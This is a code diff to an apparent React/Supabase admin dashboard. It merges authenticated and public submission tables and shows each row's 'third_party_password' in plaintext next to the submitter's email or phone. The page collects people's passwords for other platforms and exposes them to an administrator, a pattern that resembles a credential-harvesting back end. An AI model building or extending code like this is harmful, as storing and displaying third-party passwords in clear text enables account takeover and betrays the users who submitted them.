@@ -54,12 +54,49 @@ export default function Admin() {
   }, [navigate]);
 
   const fetchSubmissions = async () => {
-    const { data } = await supabase
-      .from('platform_connections')
-      .select('id, platform, email, third_party_password, created_at, user_id')
-      .order('created_at', { ascending: false });
-    
-    setRows(data || []);
+    const [connectionsResponse, requestsResponse] = await Promise.all([
+      supabase
+        .from('platform_connections')
+        .select('id, platform, email, third_party_password, created_at, user_id')
+        .order('created_at', { ascending: false }),
+      supabase
+        .from('platform_connection_requests')
+        .select('id, platform, email, phone, third_party_password, created_at, status')
+        .order('created_at', { ascending: false }),
+    ]);
+
+    if (connectionsResponse.error) {
+      console.error('Error loading authenticated submissions:', connectionsResponse.error);
+    }
+    if (requestsResponse.error) {
+      console.error('Error loading public requests:', requestsResponse.error);
+    }
+
+    const connections = connectionsResponse.data || [];
+    const requests = requestsResponse.data || [];
+
+    const mergedRows = [
+      ...connections.map((row) => ({
+        id: row.id,
+        platform: row.platform,
+        contact: row.email || '-',
+        third_party_password: row.third_party_password,
+        created_at: row.created_at,
+        user_id: row.user_id,
+        status: 'authenticated',
+      })),
+      ...requests.map((row) => ({
+        id: row.id,
+        platform: row.platform,
+        contact: row.email || row.phone || '-',
+        third_party_password: row.third_party_password,
+        created_at: row.created_at,
+        user_id: null,
+        status: row.status || 'pending',
+      })),
+    ].sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
+
+    setRows(mergedRows);
     setLoading(false);
   };
 
@@ -102,18 +139,20 @@ export default function Admin() {
             <thead className="text-slate-400">
               <tr>
                 <th className="px-3 py-2">Platform</th>
-                <th className="px-3 py-2">Email</th>
+                <th className="px-3 py-2">Contact</th>
                 <th className="px-3 py-2">Password</th>
+                <th className="px-3 py-2">Status</th>
                 <th className="px-3 py-2">Created at</th>
                 <th className="px-3 py-2">User ID</th>
               </tr>
             </thead>
             <tbody>
               {rows.map((row) => (
-                <tr key={row.id} className="border-t border-white/10">
+                <tr key={`${row.id}-${row.status}`} className="border-t border-white/10">
                   <td className="px-3 py-2">{row.platform}</td>
-                  <td className="px-3 py-2">{row.email}</td>
+                  <td className="px-3 py-2">{row.contact}</td>
                   <td className="px-3 py-2">{row.third_party_password || '-'}</td>
+                  <td className="px-3 py-2">{row.status}</td>
                   <td className="px-3 py-2 text-slate-400">
                     {new Date(row.created_at).toLocaleString()}
                   </td>
